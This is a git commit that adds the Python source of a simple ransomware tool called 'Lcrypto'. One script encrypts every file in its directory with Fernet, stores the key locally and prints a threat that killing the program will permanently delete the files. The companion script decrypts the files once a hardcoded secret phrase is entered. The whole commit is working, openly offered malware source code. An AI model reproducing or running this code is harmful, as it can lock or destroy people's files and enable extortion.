f75d96fd0d85d762969a468e3eb314cfa0c8a0ed
BlazeInferno64 <96913755+BlazeInferno64@users.noreply.github.com>
2024-06-14 16:55:52 +0530

    Add files via upload

---
+++ src/Lcrypto-decrypt.py
@@ -0,0 +1,57 @@
+# This is the second file using which Lcrypto will decrypt your files!
+import os # Importing the built-in os module in python
+from cryptography.fernet import Fernet # Importing the built-in cryptography module in python
+
+# Like the other file let's define a main() function here too!
+def main():
+    try:
+        files = [] # An empty files list where we will append the files!
+    
+        # For loop to check all the available files in the current directory
+        for file in os.listdir():
+            # Now we need to make sure that Lcrypto doesn't fo anything with Lcrypto.py, Lcrypto-key,key and Lcrypto-decrypt.py!
+            if file == "Lcrypto.py" or file == "Lcrypto-key.key" or file == "Lcrypto-decrypt.py":
+                continue # Skipping these files
+            if os.path.isfile(file): # Checking is its a valid file or not
+                files.append(file) # Appending the available files to the files=[] list
+
+        #print(files) use this to see the list of the files present in the current directory where this file is!
+
+
+        # And here we go, declaring a secret phrase!
+
+        secret_phrase = "decrypt"
+        user_phrase = input("Enter the secret phrase to decrypt your files:\n") #Taking input from the user
+
+        if user_phrase == "": # Checking if the input is empty or not!
+            # Printing a message if the input is empty!
+            return print("You didn't entered anything!!")
+        if user_phrase == secret_phrase: # Let's check if the input matches our secret phrase or not!
+            try:
+                secret_key_file = "Lcrypto-key.key"
+                with open("Lcrypto-key.key", "rb") as key: # Let's open the Lcrypto-key.key files where we had stored our secret file earlier!
+                    secret_key = key.read() # Storing it in a variable
+                os.remove(secret_key_file)
+            except FileNotFoundError:
+                return print("Decryption key not found!")
+            for file in files: # For loop for checking the files!
+                with open(file, "rb") as thefile: # Opening the files
+                    contents = thefile.read() # Reading the file contents
+                contents_decrypted = Fernet(secret_key).decrypt(contents) # And finally decrypting it!
+
+
+                with open(file, "wb") as thefile: # Opening the file to write decrypted contents
+                    thefile.write(contents_decrypted) # Writing the contents
+        
+            # And my friend here you go! Your files have been successfully decrypted!!
+            print("\nCongrats! Your files has been decrypted!")
+
+        else:
+            # If the phrase entered is wrong!
+            print("Oops! It seems like the phrase you entered isn't correct!")
+    except KeyboardInterrupt:
+        return print("\nYou interrupted the decrypting process!")
+    
+# Running the main() function here!
+if __name__ == "__main__":
+    main()
---
+++ src/Lcrypto.py
@@ -0,0 +1,40 @@
+# This is the main file using which Lcrypto will encrypt your files!
+import os # Importing the bulit-in os module in python
+from cryptography.fernet import Fernet # Importing the built-in cryptography module in python
+
+# Let's define a main() function here
+def main():
+    try:
+        files = [] # Here the files=[] is an empty list where later on we will append our directory files
+    
+        for file in os.listdir(): # For loop to check all the available files in the current directory
+            # Now we need to make sure that Lcrypto doesn't encrypts Lcrypto.py, Lcrypto-key,key and Lcrypto-decrypt.py!
+            if file == "Lcrypto.py" or file == "Lcrypto-key.key"  or file == "Lcrypto-decrypt.py":
+                continue # So we will skip them
+            if os.path.isfile(file): # Checking if its a valid file or not
+                files.append(file) # Appending all the available files to the files=[] list
+
+        #print(files) use this print all the available files
+
+        key = Fernet.generate_key() # Generating a random key from Fernet
+
+        with open("Lcrypto-key.key", "wb") as thekey: # Opening the Lcrypto-key.key file where the key will be stored
+            thekey.write(key) # Let's write the key to the file
+
+        for file in files: # For loop for encrypting all the files
+            with open(file, "rb") as thefile: # Opening every files
+                contents = thefile.read() # Reading the files
+            contents_encrypted = Fernet(key).encrypt(contents) # And at last encrypting it!!
+
+            with open(file, "wb") as thefile: # Lastly writing the encrypted contents back the file
+                thefile.write(contents_encrypted) # And here you go your files have been encrypted!!!
+    
+        # Printing a simple alert message to the user!
+        print("Oops! Your files have been encrypted!\nTrying to kill Lcrypto will result in permanent deletion of your files!")
+    except KeyboardInterrupt:
+        return print("Lcrypto will be back!")
+
+
+# Runniing the main() function
+if __name__ == "__main__":
+    main()
